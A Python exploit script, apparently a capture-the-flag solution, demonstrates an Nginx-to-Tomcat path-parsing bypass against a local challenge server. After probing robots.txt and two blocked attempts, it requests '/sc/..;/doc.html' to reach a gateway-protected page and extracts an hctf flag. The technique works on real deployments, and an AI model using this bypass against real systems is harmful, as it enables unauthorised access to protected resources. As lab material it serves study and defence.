#!/usr/bin/env python3
"""pathconfusion exp —— Nginx/后端 URI 解析差异绕过网关读取 doc.html

用法: python3 exp.py [http://host:port]    （默认 http://127.0.0.1:58000）

演示完整利用链：
  robots.txt 信息搜集 -> 直连 403 -> 朴素穿越 403 -> 分号解析差异绕过 -> 拿 flag
"""
import re
import sys

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:58000").rstrip("/")

# 1) 信息搜集：robots.txt 泄露内部文档路径
print("[*] robots.txt:")
print(requests.get(f"{BASE}/robots.txt").text)

# 2) 直连 /doc.html —— 网关精确拦截
r = requests.get(f"{BASE}/doc.html")
print(f"[*] 直连 /doc.html -> {r.status_code}（预期 403，网关拦截）")

# 3) 朴素穿越 —— Nginx 在 location 匹配前自行归一化，折叠回 /doc.html 仍被拦
r = requests.get(f"{BASE}/sc/../doc.html")
print(f"[*] 朴素穿越 /sc/../doc.html -> {r.status_code}（预期 403）")

# 4) 解析差异绕过：Nginx 不折叠 "..;"，location /sc/ 命中后按 $request_uri 原样转发；
#    后端（Tomcat 系语义）先剥离分号路径参数、再做点段归一化 -> /doc.html
r = requests.get(f"{BASE}/sc/..;/doc.html")
print(f"[*] 解析差异 /sc/..;/doc.html -> {r.status_code}（预期 200）")
m = re.search(r"hctf\{[^}]*\}", r.text)
print(f"[+] flag: {m.group(0) if m else '未找到'}")
